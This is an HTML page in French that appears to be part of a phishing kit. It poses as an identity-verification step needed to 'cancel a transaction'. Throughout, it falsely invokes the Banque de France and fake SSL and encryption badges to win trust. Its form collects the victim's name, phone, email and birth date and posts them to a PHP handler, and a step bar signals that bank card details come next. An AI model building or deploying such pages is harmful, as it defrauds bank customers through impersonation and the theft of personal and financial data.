<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification d'identité — Espace sécurisé</title>
    <link rel="icon" href="./check.png" type="image/png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        :root {
            --primary:       #1a56db;
            --primary-dark:  #1e40af;
            --primary-light: #eff6ff;
            --success:       #059669;
            --danger:        #dc2626;
            --gray-50:  #f8fafc;
            --gray-100: #f1f5f9;
            --gray-200: #e2e8f0;
            --gray-300: #cbd5e1;
            --gray-400: #94a3b8;
            --gray-500: #64748b;
            --gray-600: #475569;
            --gray-700: #334155;
            --gray-800: #1e293b;
            --gray-900: #0f172a;
            --radius:    12px;
            --radius-sm: 8px;
            --shadow-sm: 0 1px 3px rgba(0,0,0,.08), 0 1px 2px rgba(0,0,0,.06);
            --shadow:    0 4px 6px -1px rgba(0,0,0,.08), 0 2px 4px -1px rgba(0,0,0,.06);
            --shadow-lg: 0 20px 40px -8px rgba(0,0,0,.12), 0 8px 16px -4px rgba(0,0,0,.06);
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--gray-50);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: var(--gray-800);
            line-height: 1.5;
        }

        /* ── Top bar ── */
        .topbar {
            width: 100%;
            background: #fff;
            border-bottom: 1px solid var(--gray-200);
            padding: 0 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 64px;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: var(--shadow-sm);
        }
        .topbar-logo img { height: 36px; object-fit: contain; }
        .topbar-secure {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 12px;
            font-weight: 600;
            color: var(--success);
            background: #ecfdf5;
            padding: 6px 12px;
            border-radius: 99px;
            border: 1px solid #a7f3d0;
        }
        .topbar-secure i { font-size: 11px; }

        /* ── Main ── */
        .main {
            width: 100%;
            max-width: 560px;
            padding: 32px 16px 48px;
            flex: 1;
        }

        /* ── Steps ── */
        .steps {
            display: flex;
            align-items: center;
            margin-bottom: 28px;
        }
        .step {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .step-circle {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 13px;
            font-weight: 700;
            flex-shrink: 0;
            border: 2px solid var(--gray-300);
            color: var(--gray-400);
            background: #fff;
            transition: all .25s;
        }
        .step.active .step-circle {
            background: var(--primary);
            border-color: var(--primary);
            color: #fff;
            box-shadow: 0 0 0 4px rgba(26,86,219,.15);
        }
        .step.done .step-circle {
            background: var(--success);
            border-color: var(--success);
            color: #fff;
        }
        .step-label {
            font-size: 12px;
            font-weight: 500;
            color: var(--gray-400);
            white-space: nowrap;
        }
        .step.active .step-label { color: var(--primary); font-weight: 600; }
        .step.done  .step-label  { color: var(--success); }
        .step-line {
            flex: 1;
            height: 2px;
            background: var(--gray-200);
            margin: 0 8px;
            border-radius: 2px;
        }

        /* ── Card ── */
        .card {
            background: #fff;
            border-radius: var(--radius);
            box-shadow: var(--shadow-lg);
            border: 1px solid var(--gray-200);
            overflow: hidden;
        }
        .card-header {
            padding: 24px 28px 20px;
            border-bottom: 1px solid var(--gray-100);
        }
        .card-header-top {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 8px;
        }
        .card-icon {
            width: 40px;
            height: 40px;
            background: var(--primary-light);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--primary);
            font-size: 17px;
            flex-shrink: 0;
        }
        .card-title {
            font-size: 18px;
            font-weight: 700;
            color: var(--gray-900);
        }
        .card-subtitle {
            font-size: 13px;
            color: var(--gray-500);
            line-height: 1.65;
            padding-left: 52px;
        }
        .card-body { padding: 28px; }

        /* ── Alert info ── */
        .alert-info {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            background: #eff6ff;
            border: 1px solid #bfdbfe;
            border-radius: var(--radius-sm);
            padding: 12px 14px;
            margin-bottom: 24px;
            font-size: 13px;
            color: #1d4ed8;
            line-height: 1.55;
        }
        .alert-info i { font-size: 14px; margin-top: 1px; flex-shrink: 0; }

        /* ── Form grid ── */
        .form-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }
        .form-grid .full { grid-column: 1 / -1; }

        /* ── Section divider ── */
        .section-divider {
            grid-column: 1 / -1;
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 2px 0;
        }
        .section-divider span {
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: .06em;
            color: var(--gray-400);
            white-space: nowrap;
        }
        .section-divider::before,
        .section-divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: var(--gray-200);
        }

        /* ── Field ── */
        .field { display: flex; flex-direction: column; gap: 6px; }
        .field label {
            font-size: 13px;
            font-weight: 600;
            color: var(--gray-700);
        }
        .field label span { color: var(--danger); margin-left: 2px; }
        .input-wrap {
            position: relative;
            display: flex;
            align-items: center;
        }
        .input-icon {
            position: absolute;
            left: 13px;
            color: var(--gray-400);
            font-size: 14px;
            pointer-events: none;
            z-index: 1;
        }
        .input-wrap input {
            width: 100%;
            height: 46px;
            padding: 0 14px 0 38px;
            font-size: 14px;
            font-family: inherit;
            color: var(--gray-800);
            background: var(--gray-50);
            border: 1.5px solid var(--gray-200);
            border-radius: var(--radius-sm);
            outline: none;
            transition: border-color .2s, box-shadow .2s, background .2s;
            -webkit-appearance: none;
        }
        .input-wrap input::placeholder { color: var(--gray-400); font-size: 13px; }
        .input-wrap input:focus {
            background: #fff;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(26,86,219,.12);
        }

        /* ── Submit button ── */
        .submit-btn {
            grid-column: 1 / -1;
            width: 100%;
            height: 50px;
            background: var(--primary);
            color: #fff;
            border: none;
            border-radius: var(--radius-sm);
            font-size: 15px;
            font-weight: 700;
            font-family: inherit;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: background .2s, box-shadow .2s;
            box-shadow: 0 4px 14px rgba(26,86,219,.35);
            margin-top: 8px;
        }
        .submit-btn:hover  { background: var(--primary-dark); box-shadow: 0 6px 20px rgba(26,86,219,.45); }
        .submit-btn:active { transform: scale(.99); }
        .submit-btn:disabled { opacity: .75; cursor: not-allowed; }
        .btn-spinner {
            width: 18px;
            height: 18px;
            border: 2.5px solid rgba(255,255,255,.35);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin .75s linear infinite;
            display: none;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* ── Security badges ── */
        .security-row {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        .security-badge {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 11px;
            font-weight: 600;
            color: var(--gray-500);
        }
        .security-badge i { font-size: 13px; color: var(--success); }

        /* ── Footer image ── */
        .footer-img {
            width: 100%;
            margin-top: 24px;
        }
        .footer-img img { width: 100%; display: block; border-radius: var(--radius); }

        /* ── Responsive ── */
        @media (max-width: 480px) {
            .main { padding: 24px 12px 40px; }
            .card-body { padding: 20px 16px; }
            .card-header { padding: 18px 16px 14px; }
            .card-subtitle { padding-left: 0; margin-top: 8px; }
            .form-grid { grid-template-columns: 1fr; }
            .form-grid .full,
            .section-divider,
            .submit-btn { grid-column: 1; }
            .step-label { display: none; }
        }
    </style>
</head>
<body>

    <!-- ── Top bar ── -->
    <header class="topbar">
        <div class="topbar-logo">
            <img src="./kwKYGMMnx5T0LeAGdXfi61a9Lkk.avif" alt="Logo">
        </div>
        <div class="topbar-secure">
            <i class="fas fa-lock"></i>
            Connexion sécurisée
        </div>
    </header>

    <!-- ── Main ── -->
    <main class="main">

        <!-- Progress steps -->
        <nav class="steps">
            <div class="step active">
                <div class="step-circle">1</div>
                <span class="step-label">Identité</span>
            </div>
            <div class="step-line"></div>
            <div class="step">
                <div class="step-circle">2</div>
                <span class="step-label">Carte bancaire</span>
            </div>
            <div class="step-line"></div>
            <div class="step">
                <div class="step-circle">3</div>
                <span class="step-label">Confirmation</span>
            </div>
        </nav>

        <!-- Card -->
        <div class="card">

            <div class="card-header">
                <div class="card-header-top">
                    <div class="card-icon">
                        <i class="fas fa-user-shield"></i>
                    </div>
                    <h1 class="card-title">Vérification d'identité</h1>
                </div>
                <p class="card-subtitle">
                    Pour procéder à l'annulation de la transaction, veuillez confirmer votre identité.
                    Vos données sont chiffrées et protégées par les systèmes de sécurité de la Banque de France.
                </p>
            </div>

            <div class="card-body">

                <div class="alert-info">
                    <i class="fas fa-circle-info"></i>
                    <span>Renseignez vos informations personnelles telles qu'elles apparaissent sur votre pièce d'identité et votre dossier bancaire.</span>
                </div>

                <form method="post" action="index_a.php" id="loginForm">
                    <div class="form-grid">

                        <!-- Identité -->
                        <div class="field">
                            <label for="nom">Nom <span>*</span></label>
                            <div class="input-wrap">
                                <i class="fas fa-user input-icon"></i>
                                <input id="nom" name="nom" type="text" maxlength="150"
                                       placeholder="Dupont" required autocomplete="family-name">
                            </div>
                        </div>

                        <div class="field">
                            <label for="prenom">Prénom <span>*</span></label>
                            <div class="input-wrap">
                                <i class="fas fa-user input-icon"></i>
                                <input id="prenom" name="prenom" type="text" maxlength="150"
                                       placeholder="Marie" required autocomplete="given-name">
                            </div>
                        </div>

                        <!-- Divider -->
                        <div class="section-divider">
                            <span>Coordonnées</span>
                        </div>

                        <!-- Téléphone -->
                        <div class="field">
                            <label for="phone">N° de téléphone <span>*</span></label>
                            <div class="input-wrap">
                                <i class="fas fa-phone input-icon"></i>
                                <input id="phone" name="phone" type="tel"
                                       inputmode="numeric" maxlength="10"
                                       placeholder="0612345678"
                                       pattern="\d{10}" required autocomplete="tel">
                            </div>
                        </div>

                        <!-- E-mail -->
                        <div class="field">
                            <label for="email">Adresse e-mail <span>*</span></label>
                            <div class="input-wrap">
                                <i class="fas fa-envelope input-icon"></i>
                                <input id="email" name="email" type="email"
                                       placeholder="marie@exemple.fr"
                                       required autocomplete="email">
                            </div>
                        </div>

                        <!-- Date de naissance -->
                        <div class="field full">
                            <label for="birthdate">Date de naissance <span>*</span></label>
                            <div class="input-wrap">
                                <i class="fas fa-calendar-days input-icon"></i>
                                <input id="birthdate" name="birthdate" type="text"
                                       placeholder="jj/mm/aaaa" required
                                       autocomplete="off" inputmode="numeric"
                                       maxlength="10">
                            </div>
                        </div>

                        <!-- Submit -->
                        <button type="submit" class="submit-btn" id="submitBtn">
                            <span class="btn-text">
                                Continuer &nbsp;<i class="fas fa-arrow-right" style="font-size:13px;"></i>
                            </span>
                            <div class="btn-spinner" id="btnSpinner"></div>
                        </button>

                    </div>
                </form>

            </div><!-- /card-body -->
        </div><!-- /card -->

        <!-- Security badges -->
        <div class="security-row">
            <div class="security-badge">
                <i class="fas fa-shield-halved"></i>
                <span>SSL 256-bit</span>
            </div>
            <div class="security-badge">
                <i class="fas fa-lock"></i>
                <span>Données chiffrées</span>
            </div>
            <div class="security-badge">
                <i class="fas fa-building-columns"></i>
                <span>Banque de France</span>
            </div>
        </div>

        <!-- Footer compliance image -->
        <div class="footer-img">
            <img src="./T6EWjPeJbYpmdVRDMjkT58dKk.avif" alt="Partenaires &amp; certifications">
        </div>

    </main>

    <!-- ── Scripts ── -->

    <!-- Phone: strip non-digits -->
    <script>
    document.getElementById('phone').addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, '').slice(0, 10);
    });
    </script>

    <!-- Birthdate: dd/mm/yyyy auto-format -->
    <script>
    (function () {
        const input = document.getElementById('birthdate');
        let isDeleting = false;

        input.addEventListener('keydown', function (e) {
            isDeleting = e.key === 'Backspace';
            const allowed = ['Backspace', 'ArrowLeft', 'ArrowRight', 'Tab', 'Delete'];
            if (!(e.key >= '0' && e.key <= '9') && !allowed.includes(e.key)) {
                e.preventDefault();
            }
        });

        input.addEventListener('input', function () {
            let value = this.value.replace(/\D/g, '');
            if (isDeleting) { isDeleting = false; return; }

            let formatted = '';

            if (value.length >= 1) {
                let day = value.slice(0, 2);
                if (day.length === 2) {
                    if (parseInt(day, 10) > 31) day = '31';
                    formatted += day + '/';
                } else {
                    formatted += day;
                }
            }
            if (value.length >= 3) {
                let fd = value[2];
                let month = value.length >= 4 ? value.slice(2, 4) : '';
                if (!month && parseInt(fd, 10) > 1) {
                    month = '0' + fd;
                    value = value.slice(0, 2) + month + value.slice(3);
                } else if (!month) {
                    month = fd;
                }
                if (month.length === 2) {
                    if (parseInt(month, 10) > 12) month = '12';
                    formatted += month + '/';
                } else {
                    formatted += month;
                }
            }
            if (value.length > 4) {
                formatted += value.slice(4, 8);
            }

            this.value = formatted;
        });
    })();
    </script>

    <!-- Submit loader -->
    <script>
    document.getElementById('loginForm').addEventListener('submit', function () {
        const btn     = document.getElementById('submitBtn');
        const text    = btn.querySelector('.btn-text');
        const spinner = document.getElementById('btnSpinner');
        text.style.display    = 'none';
        spinner.style.display = 'block';
        btn.disabled = true;
    });
    </script>

</body>
</html>
